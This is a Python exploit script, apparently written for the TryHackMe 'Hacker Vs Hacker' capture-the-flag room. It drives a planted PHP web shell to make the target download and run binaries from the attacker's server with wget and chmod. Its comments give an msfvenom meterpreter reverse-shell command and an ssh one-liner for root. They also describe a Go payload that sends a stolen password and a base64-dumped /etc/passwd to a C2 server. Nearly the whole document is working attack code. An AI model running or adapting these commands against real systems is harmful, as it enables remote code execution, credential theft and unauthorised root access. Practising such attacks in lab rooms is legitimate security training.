#!/usr/bin/env python3
############################################################
# This script gives the attacker a foothold on the target
# machine in the Hacker Vs Hacker room on TryHackMe.com.
############################################################
# Option 1
############################################################
# The shell binary that was used in this example was 
# generated by running:
#   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<myip> LPORT=<portno> -f elf > shell
#
# The shell that is executed can be adjusted by changing
# the "cmd" variable in "upload_shell".
#
# The MYPORT variable is the port that the attacker is 
# using to serve the simple server (python3 -m http.server)
# that is hosting the shell binary.
#
# The request in "upload_shell" has its timeout set to ten
# seconds. This function assumes that the shell upload and
# execution has been successful if it has been hanging for
# ten or more seconds and, therefore, returns a success
# message when encountering a Timeout exception.
############################################################
# Option 2 (quicker root)
############################################################
# This configuration uploads a Golang binary (explore.go)
# which extracts lachlan's password and makes a GET
#
# request to the C2 server with the password as the param.
# Additionally, it dumps the /etc/password file using
# base64 and a GET request to dump the contents of the file
# to the C2 server.
#
# After the password is leaked the attacker can run the
# following to get a root meterpreter session:
#
# ssh lachlan@$TARGET -C "wget -O /tmp/pull http://$C2IP:$C2PORT/explore;chmod +x /tmp/pull;/tmp/pull -i $C2IP -p $C2PORT;/tmp/move_pkill.sh"
#
# After executing the above and entering the stolen password
# the attacker can open a meterpreter listener and wait for
# the target to reach out and connect as root.
############################################################

import argparse
import re
import requests
import time

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"


def extract_password(target_ip, attack_server, binary):
    target_url = f"http://{target_ip}/cvs/shell.pdf.php"
    server_url = f"http://{attack_server}/{binary}"

    c2ip = attack_server.split(":")[0]
    c2port = attack_server.split(":")[1]
    cmd = f"wget -O /tmp/pull {server_url};chmod +x /tmp/pull;/tmp/pull -i {c2ip} -p {c2port}"

    params = {"cmd": cmd}

    try:
        InfoMsgNB(f"Executing command \"{cmd}\"")
        resp = requests.get(target_url, params=params, timeout=30)
        if resp.status_code != 200:
            raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

        message = "Command execution successful."
        success = True
    except requests.exceptions.Timeout:
        message = "Extractor uploaded and executing."
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)

def upload_shell(target_ip, attack_server, shellname):
    target_url = f"http://{target_ip}/cvs/shell.pdf.php"
    server_url = f"http://{attack_server}/{shellname}"

    cmd = f"wget -O /tmp/shell {server_url};chmod +x /tmp/shell;/tmp/shell"

    params = {"cmd": cmd}

    try:
        InfoMsgNB(f"Executing command \"{cmd}\"")
        resp = requests.get(target_url, params=params, timeout=10)
        if resp.status_code != 200:
            raise ValueError(f"Bad Status Code ({resp.status_code} {resp.reason})")

        message = "Command execution successful."
        success = True
    except requests.exceptions.Timeout:
        message = "Shell payload uploaded and executing."
        success = True
    except Exception as ex:
        message = str(ex)
        success = False

    return (success, message)

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def main():
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("myip", help="IP address of attacker.", type=str)
    parser.add_argument("myport", help="Attacker port serving file.", type=port_type)
    parser.add_argument("shellname", help="Name of reverse shell.", type=str)

    args = parser.parse_args()

    target = args.target
    myip = args.myip
    myport = args.myport
    shellname = args.shellname

    print("="*60)
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"My IP: {myip}")
    InfoMsg(f"Serve Port: {myport}")
    InfoMsg(f"Shell Name: {shellname}")
    print("="*60)

    attack_server = f"{myip}:{myport}"

    success, message = extract_password(target, attack_server, "explore")

    if success:
        SucMsg(f"{message}")
    else:
        ErrMsg(f"{message}")

    ############################################################
    # Give explore binary time to run
    ############################################################
    #time.sleep(15)

    #success, message = upload_shell(target, attack_server, shellname)

    #if success:
    #    SucMsg(f"{message}")
    #else:
    #    ErrMsg(f"{message}")

    return

if __name__ == "__main__":
    main()

